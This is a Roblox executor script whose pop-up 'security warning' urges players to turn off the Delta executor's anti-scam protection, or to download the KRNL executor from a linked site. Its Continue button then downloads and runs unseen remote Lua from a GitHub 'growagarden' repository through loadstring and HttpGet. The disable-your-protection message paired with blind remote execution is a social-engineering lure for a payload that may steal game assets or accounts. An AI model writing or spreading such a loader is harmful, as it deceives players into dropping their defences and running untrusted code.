local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Dragging functionality
local function makeDraggable(frame, dragHandle)
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    local function updateInput(input)
        local delta = input.Position - dragStart
        local newPosition = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        
        -- Constrain to screen bounds
        local screenSize = workspace.CurrentCamera.ViewportSize
        local frameSize = frame.AbsoluteSize
        
        local minX = 0
        local maxX = screenSize.X - frameSize.X
        local minY = 0
        local maxY = screenSize.Y - frameSize.Y
        
        local constrainedX = math.max(minX, math.min(maxX, newPosition.X.Offset))
        local constrainedY = math.max(minY, math.min(maxY, newPosition.Y.Offset))
        
        frame.Position = UDim2.new(0, constrainedX, 0, constrainedY)
    end
    
    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            
            -- Visual feedback
            TweenService:Create(frame, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {
                BackgroundColor3 = Color3.fromRGB(50, 65, 90)
            }):Play()
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    -- Reset visual feedback
                    TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                        BackgroundColor3 = Color3.fromRGB(40, 50, 70)
                    }):Play()
                end
            end)
        end
    end)
    
    dragHandle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                updateInput(input)
            end
        end
    end)
end

if player:WaitForChild("PlayerGui"):FindFirstChild("WarningGui") then
    player.PlayerGui.WarningGui:Destroy()
end

local function createWarningGUI(warningText)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WarningGui"
    screenGui.Parent = player.PlayerGui
    screenGui.ResetOnSpawn = false
    
    -- Check if device is mobile
    local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
    
    -- Calculate dimensions based on screen size and device type
    local screenSize = workspace.CurrentCamera.ViewportSize
    local frameWidth, frameHeight
    
    if isMobile then
        -- Mobile: much smaller to avoid hotbar conflicts
        frameWidth = math.min(screenSize.X * 0.75, 320)
        frameHeight = math.min(screenSize.Y * 0.65, 420)
    else
        -- Desktop: compact frame
        frameWidth = math.min(screenSize.X * 0.45, 400)
        frameHeight = math.min(screenSize.Y * 0.55, 450)
    end
    
    local warningFrame = Instance.new("Frame")
    warningFrame.Size = UDim2.new(0, frameWidth, 0, frameHeight)
    warningFrame.Position = UDim2.new(0.5, -frameWidth/2, 0.45, -frameHeight/2) -- Moved up slightly to avoid hotbar
    warningFrame.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
    warningFrame.BorderSizePixel = 0
    warningFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner", warningFrame)
    corner.CornerRadius = UDim.new(0, isMobile and 8 or 12)
    
    local stroke = Instance.new("UIStroke", warningFrame)
    stroke.Color = Color3.fromRGB(180, 140, 60)
    stroke.Thickness = isMobile and 2 or 3
    
    -- Add drop shadow effect
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "DropShadow"
    shadow.Parent = screenGui
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.BackgroundTransparency = 1
    shadow.Position = warningFrame.Position
    shadow.Size = warningFrame.Size + UDim2.new(0, 10, 0, 10)
    shadow.ZIndex = warningFrame.ZIndex - 1
    shadow.Image = "rbxasset://textures/ui/Controls/DropShadow.png"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(12, 12, 12, 12)
    
    local watermark = Instance.new("TextLabel", warningFrame)
    watermark.Size = UDim2.new(1, 0, 0, isMobile and 14 or 16)
    watermark.Position = UDim2.new(0, 0, 1, isMobile and -18 or -20)
    watermark.BackgroundTransparency = 1
    watermark.Text = "Developer: @pocarisv"
    watermark.Font = Enum.Font.Gotham
    watermark.TextSize = isMobile and 8 or 10
    watermark.TextColor3 = Color3.fromRGB(180, 180, 180)
    watermark.TextXAlignment = Enum.TextXAlignment.Center
    
    local titleFrame = Instance.new("Frame")
    titleFrame.Size = UDim2.new(1, -16, 0, isMobile and 28 or 32)
    titleFrame.Position = UDim2.new(0, 8, 0, 8)
    titleFrame.BackgroundTransparency = 1
    titleFrame.Parent = warningFrame
    
    -- Make title frame the drag handle
    local dragHandle = Instance.new("TextButton")
    dragHandle.Size = UDim2.new(1, 0, 1, 0)
    dragHandle.BackgroundTransparency = 1
    dragHandle.Text = ""
    dragHandle.Parent = titleFrame
    
    local warningIcon = Instance.new("TextLabel")
    warningIcon.Size = UDim2.new(0, isMobile and 20 or 24, 1, 0)
    warningIcon.BackgroundTransparency = 1
    warningIcon.Text = "⚠️"
    warningIcon.Font = Enum.Font.GothamBold
    warningIcon.TextSize = isMobile and 16 or 18
    warningIcon.TextColor3 = Color3.fromRGB(200, 180, 100)
    warningIcon.TextXAlignment = Enum.TextXAlignment.Left
    warningIcon.Parent = titleFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -(isMobile and 50 or 60), 1, 0)
    titleLabel.Position = UDim2.new(0, isMobile and 25 or 29, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Warning"
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = isMobile and 14 or 16
    titleLabel.TextColor3 = Color3.fromRGB(200, 180, 100)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleFrame
    
    -- Add drag indicator
    local dragIndicator = Instance.new("TextLabel")
    dragIndicator.Size = UDim2.new(0, isMobile and 25 or 31, 1, 0)
    dragIndicator.Position = UDim2.new(1, -(isMobile and 25 or 31), 0, 0)
    dragIndicator.BackgroundTransparency = 1
    dragIndicator.Text = "≡"
    dragIndicator.Font = Enum.Font.GothamBold
    dragIndicator.TextSize = isMobile and 12 or 14
    dragIndicator.TextColor3 = Color3.fromRGB(150, 150, 150)
    dragIndicator.TextXAlignment = Enum.TextXAlignment.Center
    dragIndicator.Parent = titleFrame
    
    local textFrame = Instance.new("ScrollingFrame")
    textFrame.Size = UDim2.new(1, -16, 1, isMobile and -75 or -85)
    textFrame.Position = UDim2.new(0, 8, 0, isMobile and 40 or 44)
    textFrame.BackgroundColor3 = Color3.fromRGB(50, 60, 80)
    textFrame.BorderSizePixel = 0
    textFrame.ScrollBarThickness = isMobile and 3 or 4
    textFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 130, 200)
    textFrame.Parent = warningFrame
    
    local textCorner = Instance.new("UICorner", textFrame)
    textCorner.CornerRadius = UDim.new(0, 6)
    
    local warningLabel = Instance.new("TextLabel")
    warningLabel.Size = UDim2.new(1, -16, 0, 0)
    warningLabel.Position = UDim2.new(0, 8, 0, 8)
    warningLabel.BackgroundTransparency = 1
    warningLabel.Text = warningText
    warningLabel.Font = Enum.Font.Gotham
    warningLabel.TextSize = isMobile and 10 or 12
    warningLabel.TextColor3 = Color3.new(1, 1, 1)
    warningLabel.TextWrapped = true
    warningLabel.TextXAlignment = Enum.TextXAlignment.Left
    warningLabel.TextYAlignment = Enum.TextYAlignment.Top
    warningLabel.Parent = textFrame
    
    -- Auto-size the text label
    local textService = game:GetService("TextService")
    local textBounds = textService:GetTextSize(warningText, warningLabel.TextSize, warningLabel.Font, Vector2.new(textFrame.AbsoluteSize.X - 16, math.huge))
    warningLabel.Size = UDim2.new(1, -16, 0, textBounds.Y + 8)
    textFrame.CanvasSize = UDim2.new(0, 0, 0, textBounds.Y + 24)
    
    local buttonFrame = Instance.new("Frame")
    buttonFrame.Size = UDim2.new(1, -16, 0, isMobile and 28 or 32)
    buttonFrame.Position = UDim2.new(0, 8, 1, isMobile and -36 or -40)
    buttonFrame.BackgroundTransparency = 1
    buttonFrame.Parent = warningFrame
    
    local downloadBtn = Instance.new("TextButton")
    downloadBtn.Size = UDim2.new(0.48, 0, 1, 0)
    downloadBtn.BackgroundColor3 = Color3.fromRGB(180, 140, 60)
    downloadBtn.Text = isMobile and "Get KRNL" or "Download KRNL"
    downloadBtn.TextSize = isMobile and 10 or 12
    downloadBtn.Font = Enum.Font.GothamBold
    downloadBtn.TextColor3 = Color3.new(1, 1, 1)
    downloadBtn.BorderSizePixel = 0
    downloadBtn.Parent = buttonFrame
    
    local dlCorner = Instance.new("UICorner", downloadBtn)
    dlCorner.CornerRadius = UDim.new(0, isMobile and 4 or 6)
    
    local continueBtn = Instance.new("TextButton")
    continueBtn.Size = UDim2.new(0.48, 0, 1, 0)
    continueBtn.Position = UDim2.new(0.52, 0, 0, 0)
    continueBtn.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    continueBtn.Text = "Continue (5s)"
    continueBtn.TextSize = isMobile and 10 or 12
    continueBtn.Font = Enum.Font.GothamBold
    continueBtn.TextColor3 = Color3.fromRGB(100, 100, 100)
    continueBtn.BorderSizePixel = 0
    continueBtn.Active = false
    continueBtn.Parent = buttonFrame
    
    local contCorner = Instance.new("UICorner", continueBtn)
    contCorner.CornerRadius = UDim.new(0, isMobile and 4 or 6)
    
    -- Enhanced button animations
    downloadBtn.MouseEnter:Connect(function()
        TweenService:Create(downloadBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Color3.fromRGB(200, 160, 80),
            Size = UDim2.new(0.48, 2, 1, 2)
        }):Play()
    end)
    
    downloadBtn.MouseLeave:Connect(function()
        TweenService:Create(downloadBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
            BackgroundColor3 = Color3.fromRGB(180, 140, 60),
            Size = UDim2.new(0.48, 0, 1, 0)
        }):Play()
    end)
    
    downloadBtn.MouseButton1Click:Connect(function()
        -- Add click animation
        TweenService:Create(downloadBtn, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {
            Size = UDim2.new(0.48, -2, 1, -2)
        }):Play()
        wait(0.1)
        TweenService:Create(downloadBtn, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {
            Size = UDim2.new(0.48, 0, 1, 0)
        }):Play()
        
        pcall(function() setclipboard("https://krnl.cat/downloads/") end)
        pcall(function() game:GetService("GuiService"):OpenBrowserWindow("https://krnl.cat/downloads/") end)
    end)
    
    local countdown = 5
    local countdownConnection = RunService.Heartbeat:Connect(function()
        countdown = countdown - RunService.Heartbeat:Wait()
        
        if countdown > 0 then
            continueBtn.Text = "Continue (" .. math.ceil(countdown) .. "s)"
        else
            continueBtn.Active = true
            continueBtn.Text = "Continue"
            continueBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 70)
            continueBtn.TextColor3 = Color3.new(1, 1, 1)
            
            continueBtn.MouseEnter:Connect(function()
                if continueBtn.Active then
                    TweenService:Create(continueBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                        BackgroundColor3 = Color3.fromRGB(90, 180, 90),
                        Size = UDim2.new(0.48, 2, 1, 2)
                    }):Play()
                end
            end)
            
            continueBtn.MouseLeave:Connect(function()
                if continueBtn.Active then
                    TweenService:Create(continueBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
                        BackgroundColor3 = Color3.fromRGB(70, 160, 70),
                        Size = UDim2.new(0.48, 0, 1, 0)
                    }):Play()
                end
            end)
            
            countdownConnection:Disconnect()
        end
    end)
    
    continueBtn.MouseButton1Click:Connect(function()
        if continueBtn.Active then
            -- Add click animation
            TweenService:Create(continueBtn, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {
                Size = UDim2.new(0.48, -2, 1, -2)
            }):Play()
            wait(0.1)
            
            -- Close animation
            TweenService:Create(warningFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                Size = UDim2.new(0, 0, 0, 0), 
                Position = UDim2.new(0.5, 0, 0.5, 0),
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                ImageTransparency = 1
            }):Play()
            wait(0.3)
            screenGui:Destroy()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/dino.lua"))()
        end
    end)
    
    -- Make the frame draggable
    makeDraggable(warningFrame, dragHandle)
    
    -- Initial animation
    warningFrame.Size = UDim2.new(0, 0, 0, 0)
    warningFrame.Position = UDim2.new(0.5, 0, 0.45, 0)
    warningFrame.BackgroundTransparency = 1
    shadow.ImageTransparency = 1
    
    TweenService:Create(warningFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, frameWidth, 0, frameHeight),
        Position = UDim2.new(0.5, -frameWidth/2, 0.45, -frameHeight/2),
        BackgroundTransparency = 0
    }):Play()
    TweenService:Create(shadow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        ImageTransparency = 0.5
    }):Play()
end

local warningText = [[⚠️ IMPORTANT SECURITY WARNING ⚠️
Dear User,
We're experiencing a problem within Delta Executors and its because of their update in their anti-scam feature, this renders our script into false-positive and make it not work.
To fix this we need your cooperation and turn off anti-scam feature of Delta, to do this follow the following steps below:
1. Open your Delta Menu.
2. Look for a Gear looking Icon and press it. (4th Icon in the Delta Menu)
3. Look for Anti-Scam and turn it off.
4. Our script should work after this, make sure to turn it back on after using the script.
5. Enjoy the game ;)
Alternatively: You can use KRNL Executor but that requires downloading another executor again.
- @pocarisv
]]

createWarningGUI(warningText)
